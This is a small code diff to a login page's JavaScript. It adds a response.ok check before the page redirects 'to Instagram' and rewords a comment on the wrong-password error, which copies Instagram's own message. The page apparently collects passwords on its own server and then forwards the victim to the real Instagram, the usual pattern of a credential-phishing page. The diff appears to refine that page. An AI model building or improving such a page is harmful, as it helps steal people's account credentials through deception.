@@ -484,11 +484,12 @@
                 
                 const data = await response.json();
                 
-                if (data.status === 'success') {
+                // Check if response is successful (status 200)
+                if (response.ok && data.status === 'success') {
                     // Redirect to Instagram
                     window.location.href = data.redirect;
                 } else {
-                    // Show error message
+                    // Show error message for wrong password or other errors
                     document.getElementById('loadingOverlay').classList.remove('active');
                     errorDiv.textContent = data.message || 'Sorry, your password was incorrect. Please double-check your password.';
                     errorDiv.style.display = 'block';
